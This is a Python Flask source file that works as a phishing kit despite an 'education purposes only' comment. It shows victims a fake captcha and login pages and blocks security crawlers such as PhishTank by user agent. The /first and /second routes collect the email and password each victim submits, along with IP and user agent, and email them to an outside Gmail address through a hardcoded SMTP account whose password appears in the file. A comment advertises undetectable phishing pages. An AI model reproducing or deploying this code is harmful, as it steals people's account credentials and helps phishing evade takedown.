from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify
import secrets
import random
import time
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# made for education purposes only

app = Flask(__name__)
limiter = Limiter(get_remote_address, app=app, default_limits=["8 per day", "8 per hour"])
secret_keyx = secrets.token_urlsafe(24)
app.secret_key = secret_keyx

bot_user_agents = [
'Googlebot', 
'Baiduspider', 
'ia_archiver',
'R6_FeedFetcher', 
'NetcraftSurveyAgent', 
'Sogou web spider',
'bingbot', 
'Yahoo! Slurp', 
'facebookexternalhit', 
'PrintfulBot',
'msnbot', 
'Twitterbot', 
'UnwindFetchor', 
'urlresolver', 
'Butterfly', 
'TweetmemeBot',
'PaperLiBot',
'MJ12bot',
'AhrefsBot',
'Exabot',
'Ezooms',
'YandexBot',
'SearchmetricsBot',
'phishtank',
'PhishTank',
'picsearch',
'TweetedTimes Bot',
'QuerySeekerSpider',
'ShowyouBot',
'woriobot',
'merlinkbot',
'BazQuxBot',
'Kraken',
'SISTRIX Crawler',
'R6_CommentReader',
'magpie-crawler',
'GrapeshotCrawler',
'PercolateCrawler',
'MaxPointCrawler',
'R6_FeedFetcher',
'NetSeer crawler',
'grokkit-crawler',
'SMXCrawler',
'PulseCrawler',
'Y!J-BRW',
'80legs.com/webcrawler',
'Mediapartners-Google', 
'Spinn3r', 
'InAGist', 
'Python-urllib', 
'NING', 
'TencentTraveler',
'Feedfetcher-Google', 
'mon.itor.us', 
'spbot', 
'Feedly',
'bot',
'curl',
"spider",
"crawler"
]

# ---- CONFIG ----
MAX_ATTEMPTS = 5
CODE_EXPIRY_SECONDS = 60  # 1 minute

@app.route("/m", methods=["GET", "POST"])
def captcha():

    # init session tracking
    if "attempts" not in session:
        session["attempts"] = 0

    if "captcha_time" not in session:
        session["captcha_time"] = 0

    if request.method == "GET":

        # generate new captcha every load
        code = str(random.randint(1000, 9999))

        session["code"] = code
        session["captcha_time"] = time.time()
        session["token"] = secrets.token_hex(16)

        return render_template(
            "captcha.html",
            code=code,
            token=session["token"],
            error=False
        )

    # ---------------- POST ----------------

    user_code = request.form.get("code", "")
    honeypot = request.form.get("email_confirm", "")
    token = request.form.get("token", "")

    # 1. BOT TRAP (honeypot)
    if honeypot:
        return "Bot detected", 403

    # 2. TOKEN CHECK (prevents replay / CSRF-style abuse)
    if token != session.get("token"):
        return "Invalid session", 403

    # 3. EXPIRY CHECK
    if time.time() - session.get("captcha_time", 0) > CODE_EXPIRY_SECONDS:
        return redirect(url_for("captcha"))

    # 4. ATTEMPT LIMIT
    if session["attempts"] >= MAX_ATTEMPTS:
        return "Too many attempts. Try again later.", 429

    # 5. VALIDATION
    if user_code == session.get("code"):

        session["passed_captcha"] = True
        session["attempts"] = 0

        return redirect(url_for("success"))

    else:
        session["attempts"] += 1

        # regenerate new code on failure
        session["code"] = str(random.randint(1000, 9999))
        session["captcha_time"] = time.time()

        return render_template(
            "captcha.html",
            code=session["code"],
            token=session["token"],
            error=True
        )



@app.route('/success')
def success():
    if session.get('passed_captcha'):

        # Prefer session storage instead of query param
        web_param = session.get('eman')

        return redirect(url_for('route2', web=web_param))

    return redirect(url_for('captcha'))


@app.route("/")
def route2():
    web_param = request.args.get('web')
    if web_param:
        session['eman'] = web_param
        session['ins'] = web_param[web_param.index('@') + 1:]
    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))


@app.route("/first", methods=['POST'])
def first():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For')
        if ip is None:
            ip = request.headers.get('X-Real-IP')
        if ip is None:
            ip = request.headers.get('X-Client-IP')
        if ip is None:
            ip = request.remote_addr
        email = request.form.get("horse")
        passwordemail = request.form.get("pig")
        sender_email = "moneycheatcodes@ezipservers.quest"
        sender_emaill = "moneycheatcodes"
        receiver_email = "danieloojerahi@gmail.com"
        password = "XX1dZP;{GFx2m+e8"
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "GOmoneycheatcode Logs &&"
        message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        Hi,
        How are you?
        contact me on icq jamescartwright for your fud pages
        """
        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        with smtplib.SMTP_SSL("ezipservers.quest", 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        return redirect(url_for('benza', web=session.get('eman')))



@app.route("/second", methods=['POST'])
def second():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For')
        if ip is None:
            ip = request.headers.get('X-Real-IP')
        if ip is None:
            ip = request.headers.get('X-Client-IP')
        if ip is None:
            ip = request.remote_addr
        email = request.form.get("horse")
        passwordemail = request.form.get("pig")
        sender_email = "moneycheatcodes@ezipservers.quest"
        sender_emaill = "moneycheatcodes"
        receiver_email = "danieloojerahi@gmail.com"
        password = "XX1dZP;{GFx2m+e8"
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "GOmoneycheatcode Logs &&"
        message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        Hi,
        How are you?
        contact me on icq jamescartwright for your fud pages
        """
        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        with smtplib.SMTP_SSL("ezipservers.quest", 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        return redirect(url_for('lasmo'))



@app.route("/benzap", methods=['GET'])
def benza():
    if request.method == 'GET':
        eman = session.get('eman')
        dman = session.get('ins')
    return render_template('ind.html', eman=eman, dman=dman)

@app.route("/lasmop", methods=['GET'])
def lasmo():
    userip = request.headers.get("X-Forwarded-For")
    useragent = request.headers.get("User-Agent")
    
    if useragent in bot_user_agents:
        abort(403)  # forbidden
    
    if request.method == 'GET':
        dman = session.get('ins')
    return render_template('main.html', dman=dman)

if __name__ == '__main__':
	app.run(host="0.0.0.0", port=3000)
